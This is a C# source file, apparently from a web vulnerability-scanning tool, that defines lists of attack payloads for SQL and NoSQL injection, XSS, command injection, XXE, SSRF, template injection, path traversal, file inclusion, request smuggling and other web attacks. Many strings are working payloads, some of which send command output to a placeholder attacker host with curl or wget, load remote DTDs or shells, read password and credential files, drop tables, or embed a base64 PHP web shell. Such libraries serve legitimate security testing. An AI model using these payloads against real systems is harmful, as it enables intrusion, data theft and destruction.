using System;
using System.Collections.Generic;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Advanced payload collections for comprehensive vulnerability testing
    /// Contains cutting-edge exploitation vectors for OWASP Top 10 2025
    /// </summary>
    public static class AdvancedPayloads
    {
        #region SQL Injection Payloads

        public static readonly List<string> SQLInjectionPayloads = new List<string>
        {
            // Classic SQL Injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "admin'--",
            "admin' #",
            "admin'/*",

            // Union-based SQL Injection
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' UNION SELECT @@version--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",

            // Boolean-based Blind SQL Injection
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'x'='x",
            "' AND 'x'='y",
            "' AND SUBSTRING(@@version,1,1)='5",

            // Time-based Blind SQL Injection
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "'; pg_sleep(5)--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR IF(1=1,SLEEP(5),0)--",

            // Error-based SQL Injection
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "' AND updatexml(1,concat(0x7e,@@version),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

            // Stacked Queries
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('whoami')--",
            "'; SHUTDOWN--",

            // Second Order SQL Injection
            "admin'||'",
            "admin'+'",
            "admin'%00",

            // SQL Injection via HTTP Headers
            "' OR '1'='1' --",

            // Polyglot SQL Injection
            "SLEEP(5)/*' OR SLEEP(5) OR '\" OR SLEEP(5) OR \"*/",

            // Advanced Bypass Techniques
            "' OR '1'='1' UNION SELECT NULL--",
            "' /*!50000OR*/ '1'='1",
            "' %23%0A OR 1=1--",
            "' /**/OR/**/1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",

            // Database-specific
            "' AND 1=CONVERT(int,(SELECT @@version))--", // MSSQL
            "' AND 1=CAST((SELECT version()) AS int)--", // PostgreSQL
            "' AND 1=0x414141--", // MySQL HEX

            // Out-of-band SQL Injection
            "'; EXEC master..xp_dirtree '\\\\attacker.com\\a'--",
            "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\'))--",

            // JSON SQL Injection
            "{\"id\": \"1' OR '1'='1\"}",

            // XML SQL Injection
            "<id>1' OR '1'='1</id>",

            // Unicode/Encoding Bypass
            "\\u0027 OR 1=1--",
            "%27 OR 1=1--",
            "&#39; OR 1=1--"
        };

        #endregion

        #region NoSQL Injection Payloads

        public static readonly List<string> NoSQLInjectionPayloads = new List<string>
        {
            // MongoDB Injection
            "' || '1'=='1",
            "' && '1'=='1",
            "{\"$gt\":\"\"}",
            "{\"$ne\":null}",
            "{\"$where\":\"1==1\"}",
            "{\"$regex\":\".*\"}",
            "{\"$gt\":0}",
            "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",

            // JavaScript Injection in MongoDB
            "'; return true; var dummy='",
            "'; return db.getCollectionNames(); var dummy='",
            "'; sleep(5000); var dummy='",

            // Array Injection
            "[$ne]=1",
            "[$gt]=",
            "[$regex]=.*",

            // Operator Injection
            "admin' && this.password!='",
            "admin' || this.password==''",

            // CouchDB Injection
            "{\"selector\":{\"_id\":{\"$gt\":null}}}",

            // Time-based NoSQL
            "';sleep(5000);'",
            "';return new Promise(r=>setTimeout(r,5000));'"
        };

        #endregion

        #region XSS Payloads

        public static readonly List<string> XSSPayloads = new List<string>
        {
            // Basic XSS
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",

            // Event Handler XSS
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",

            // Advanced XSS
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", // Base64 encoded
            "<svg><script>alert&#40;1&#41;</script>",
            "<iframe src=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",

            // DOM-based XSS
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "javascript:eval('alert(1)')",

            // Filter Bypass XSS
            "<scr<script>ipt>alert(1)</scr<script>ipt>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<svg/onload=alert(1)>",
            "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",

            // UTF-7 XSS
            "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",

            // Polyglot XSS
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>/\\x3e",

            // XSS with HTML5
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",

            // Attribute-based XSS
            "\" onload=\"alert(1)",
            "' onload='alert(1)",

            // XSS via CSS
            "<style>@import'javascript:alert(1)';</style>",
            "<link rel=stylesheet href=javascript:alert(1)>",

            // Angular Template Injection XSS
            "{{constructor.constructor('alert(1)')()}}",
            "{{7*7}}",
            "{{ this.constructor.constructor('alert(1)')() }}",

            // React XSS
            "<a href=\"javascript:alert(1)\">click</a>",

            // Vue.js XSS
            "{{constructor.constructor('alert(1)')()}}",

            // Mutation XSS
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",

            // WAF Bypass XSS
            "<img src=\"x\" onerror=\"window['al'+'ert'](1)\">",
            "<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",

            // XML-based XSS
            "<![CDATA[<script>alert(1)</script>]]>",

            // SVG-based XSS
            "<svg><script>alert&#40;1&#41;</script></svg>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",

            // JSON XSS
            "{\"data\":\"<script>alert(1)</script>\"}",

            // Markdown XSS
            "[XSS](javascript:alert(1))",
            "![XSS](javascript:alert(1))"
        };

        #endregion

        #region Command Injection Payloads

        public static readonly List<string> CommandInjectionPayloads = new List<string>
        {
            // Unix/Linux Command Injection
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; whoami",
            "| whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; id",
            "| id",

            // Windows Command Injection
            "& dir",
            "| dir",
            "&& dir",
            "|| dir",
            "; dir",
            "& whoami",
            "| whoami",

            // Blind Command Injection
            "; sleep 5",
            "| sleep 5",
            "& ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",

            // Time-based
            "; sleep 10 #",
            "& timeout 10",
            "| Start-Sleep -s 10",

            // Out-of-band
            "; curl http://attacker.com?data=$(whoami)",
            "| wget http://attacker.com?data=`id`",

            // Advanced Bypass
            ";$(echo${IFS}ls)",
            "|{echo,ls}",
            ";l\\s",
            ";l''s",
            ";l\"\"s",

            // Environment Variable Injection
            "; echo $PATH",
            "| echo %PATH%",

            // Polyglot Command Injection
            "'; ls; #",
            "\"; ls; #",

            // Newline Injection
            "%0als",
            "%0dls",

            // Parameter Expansion
            "${PATH:0:1}",
            "$((1+1))"
        };

        #endregion

        #region LDAP Injection Payloads

        public static readonly List<string> LDAPInjectionPayloads = new List<string>
        {
            // Basic LDAP Injection
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin*",
            "admin*)((|userpassword=*",

            // LDAP Filter Bypass
            "*)(&(objectClass=*",
            "*)(&(cn=*",
            "*)(|(password=*",

            // Blind LDAP Injection
            "admin)(&(password=*",
            "admin)(&(objectClass=*",

            // Advanced LDAP Injection
            "*)(objectClass=*))(|(objectClass=*",
            "*)(&(objectClass=*)(cn=*",
            "*)(&(|(objectClass=*",

            // Null Byte Injection
            "admin%00",
            "admin*%00",

            // Unicode Bypass
            "\\2a",
            "\\28",
            "\\29"
        };

        #endregion

        #region XXE (XML External Entity) Payloads

        public static readonly List<string> XXEPayloads = new List<string>
        {
            // Basic XXE
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",

            // XXE with DTD
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo/>",

            // Blind XXE
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/\"> %xxe;]><foo/>",

            // XXE via SVG
            "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><text>&xxe;</text></svg>",

            // XXE via SOAP
            "<soap:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo></soap:Body>",

            // XXE with Parameter Entities
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><foo>&send;</foo>",

            // XXE via XLSX/DOCX
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><x>&xxe;</x>",

            // UTF-7 XXE
            "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-"
        };

        #endregion

        #region SSRF (Server-Side Request Forgery) Payloads

        public static readonly List<string> SSRFPayloads = new List<string>
        {
            // Basic SSRF
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254", // AWS metadata
            "http://metadata.google.internal", // GCP metadata

            // SSRF with different protocols
            "file:///etc/passwd",
            "dict://localhost:11211",
            "gopher://127.0.0.1:6379",
            "ldap://localhost:389",
            "tftp://localhost",

            // URL Bypass
            "http://127.1",
            "http://2130706433", // Decimal IP
            "http://0x7f000001", // Hex IP
            "http://0177.0.0.1", // Octal IP
            "http://127.0.0.1.xip.io",
            "http://127.0.0.1.nip.io",

            // DNS Rebinding
            "http://spoofed.burpcollaborator.net",

            // Cloud Metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",

            // Port Scanning
            "http://localhost:22",
            "http://localhost:3306",
            "http://localhost:6379",
            "http://localhost:27017",

            // Unicode Bypass
            "http://127.0.0.1%E3%80%82",
            "http://127。0。0。1",

            // URL Schema Bypass
            "jar:http://attacker.com!/",
            "netdoc:///etc/passwd",

            // Double Encoding
            "http://%32%35%35%2e%30%2e%30%2e%31"
        };

        #endregion

        #region SSTI (Server-Side Template Injection) Payloads

        public static readonly List<string> SSTIPayloads = new List<string>
        {
            // Generic SSTI Detection
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",

            // Jinja2 (Python)
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{7*'7'}}",

            // Twig (PHP)
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
            "{{_self.env.setCache(\"ftp://attacker.net:2121\")}}",

            // Freemarker (Java)
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",

            // Velocity (Java)
            "#set($str=$class.inspect(\"java.lang.String\").type)",
            "#set($chr=$class.inspect(\"java.lang.Character\").type)",

            // Smarty (PHP)
            "{system('ls')}",
            "{php}echo `id`;{/php}",

            // Thymeleaf (Java)
            "${T(java.lang.Runtime).getRuntime().exec('id')}",

            // ERB (Ruby)
            "<%= system('id') %>",
            "<%= `whoami` %>",

            // Jade/Pug (Node.js)
            "#{global.process.mainModule.require('child_process').execSync('id')}",

            // Handlebars
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",

            // AngularJS
            "{{constructor.constructor('alert(1)')()}}",

            // Tornado (Python)
            "{% import os %}{{os.system('whoami')}}"
        };

        #endregion

        #region Path Traversal Payloads

        public static readonly List<string> PathTraversalPayloads = new List<string>
        {
            // Basic Path Traversal
            "../",
            "..\\",
            "../../",
            "..\\..\\",
            "../../../",
            "..\\..\\..\\",
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",

            // Absolute Paths
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",

            // URL Encoded
            "%2e%2e%2f",
            "%2e%2e/",
            "..%2f",
            "%2e%2e%5c",

            // Double URL Encoded
            "%252e%252e%252f",
            "%252e%252e/",

            // Unicode/UTF-8 Encoded
            "..%c0%af",
            "..%c1%9c",
            "..%e0%80%af",

            // Null Byte Injection
            "../../../etc/passwd%00",
            "..\\..\\..\\windows\\win.ini%00",

            // UNC Path (Windows)
            "\\\\localhost\\c$\\",
            "\\\\127.0.0.1\\c$\\windows\\system32\\config\\sam",

            // Case Sensitivity Bypass
            "..\\/",
            "..\\\\",

            // Stripped Sequences
            "....//",
            "....\\\\",
            "..;/",

            // Overlong UTF-8
            "..%c0%af",

            // ZIP File Path Traversal
            "../../shell.php",

            // Path Truncation
            "../../../../../../../../../../../../etc/passwd",

            // Wildcard Bypass
            "/etc/pas*wd",
            "/e??/passwd"
        };

        #endregion

        #region File Inclusion Payloads

        public static readonly List<string> FileInclusionPayloads = new List<string>
        {
            // Local File Inclusion (LFI)
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "php://filter/read=string.rot13/resource=index.php",
            "expect://whoami",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",

            // Remote File Inclusion (RFI)
            "http://attacker.com/shell.txt",
            "ftp://attacker.com/shell.php",
            "\\\\attacker.com\\share\\shell.php",

            // PHP Wrappers
            "php://filter/resource=index.php",
            "zip://archive.zip#shell.php",
            "phar://archive.phar/shell.php",

            // Log Poisoning
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "C:\\xampp\\apache\\logs\\access.log",

            // Session File Inclusion
            "/var/lib/php/sessions/sess_[PHPSESSID]",
            "C:\\Windows\\Temp\\sess_[PHPSESSID]",

            // /proc/ LFI
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/stat",

            // Filter Bypass
            "....//....//....//etc/passwd",
            "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
        };

        #endregion

        #region CRLF Injection Payloads

        public static readonly List<string> CRLFInjectionPayloads = new List<string>
        {
            // Basic CRLF Injection
            "%0d%0aSet-Cookie: admin=true",
            "%0d%0aLocation: http://attacker.com",
            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK",

            // Response Splitting
            "%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Injected</html>",

            // Header Injection
            "%0d%0aX-XSS-Protection: 0",
            "%0d%0aX-Frame-Options: ALLOW",

            // Double Encoded
            "%0d%0a%0d%0aHTTP/1.1 200 OK",

            // Unicode
            "%E5%98%8A%E5%98%8DSet-Cookie: admin=true",

            // Mixed Encoding
            "\\r\\nSet-Cookie: admin=true",
            "%5cr%5cnSet-Cookie: admin=true"
        };

        #endregion

        #region JWT Attack Payloads

        public static readonly List<string> JWTAttackPayloads = new List<string>
        {
            // None Algorithm Attack
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.",

            // Algorithm Confusion (RS256 to HS256)
            // Would need public key to generate valid payload

            // Weak Secret Bruteforce Indicators
            "secret",
            "password",
            "123456",

            // JWT ID Collision
            "Same JTI with different payload",

            // JWT Expiry Bypass
            "Very long exp time",

            // Kid (Key ID) Injection
            "../../../dev/null",
            "../../public.key",
            "http://attacker.com/public.key",

            // JKU (JSON Web Key URL) Injection
            "http://attacker.com/.well-known/jwks.json",

            // X5U (X.509 URL) Injection
            "http://attacker.com/cert.pem"
        };

        #endregion

        #region HTTP Request Smuggling Payloads

        public static readonly List<string> HTTPSmugglingPayloads = new List<string>
        {
            // CL.TE (Content-Length.Transfer-Encoding)
            "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",

            // TE.CL (Transfer-Encoding.Content-Length)
            "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\n\r\n0\r\n\r\n",

            // TE.TE (Transfer-Encoding.Transfer-Encoding)
            "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\n",

            // HTTP/2 Smuggling
            ":method: POST\r\n:path: /\r\ncontent-length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
        };

        #endregion

        #region Open Redirect Payloads

        public static readonly List<string> OpenRedirectPayloads = new List<string>
        {
            // Basic Open Redirect
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "////evil.com",

            // Protocol-less
            "//evil.com",
            "\\/\\/evil.com",

            // URL Encoded
            "%2f%2fevil.com",
            "%2F%2Fevil.com",

            // Scheme Manipulation
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",

            // Host Confusion
            "http://evil.com@target.com",
            "http://target.com.evil.com",

            // Unicode
            "http://evil.com%E3%80%82",

            // XSS via Open Redirect
            "javascript://evil.com%0aalert(1)",

            // Domain Confusion
            "http://targєt.com", // Cyrillic 'є'

            // Double Slash
            "http:/evil.com"
        };

        #endregion

        #region IDOR (Insecure Direct Object Reference) Test Values

        public static readonly List<string> IDORTestValues = new List<string>
        {
            // Numeric IDs
            "1", "2", "3", "100", "999", "9999",
            "0", "-1", "2147483647", // Max int

            // String IDs
            "admin", "administrator", "root", "user",
            "test", "guest", "demo",

            // GUID Patterns
            "00000000-0000-0000-0000-000000000000",
            "11111111-1111-1111-1111-111111111111",

            // Path Traversal in IDs
            "../1", "../../admin", "../../../config",

            // Special Characters
            "*", "%", "null", "undefined",

            // Array/Multiple Values
            "1,2,3", "[1,2,3]", "{id:1}"
        };

        #endregion

        #region CORS Misconfiguration Test Origins

        public static readonly List<string> CORSTestOrigins = new List<string>
        {
            "http://evil.com",
            "https://evil.com",
            "http://attacker.com",
            "null",
            "http://localhost",
            "http://127.0.0.1",
            "file://",
            "http://target.com.evil.com",
            "http://evil-target.com"
        };

        #endregion

        #region CSRF Token Bypass Values

        public static readonly List<string> CSRFBypassValues = new List<string>
        {
            "",
            "null",
            "undefined",
            "0",
            "false",
            "[]",
            "{}",
            "same_token_different_user",
            "old_token",
            "any_random_string"
        };

        #endregion
    }
}
